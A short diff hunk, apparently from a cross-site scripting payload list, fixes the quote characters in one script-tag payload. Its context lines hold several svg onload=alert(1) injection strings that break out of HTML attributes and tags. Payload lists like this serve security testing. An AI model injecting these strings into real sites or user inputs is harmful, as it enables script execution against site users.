@@ -1,4 +1,4 @@
-”/>&lt;script>alert(1)&lt;/script&gt”/>
+"/>&lt;script>alert(1)&lt;/script&gt"/>
 <svg onload=alert(1)>
 "><svg onload=alert(1)>
 </tag><svg onload=alert(1)>
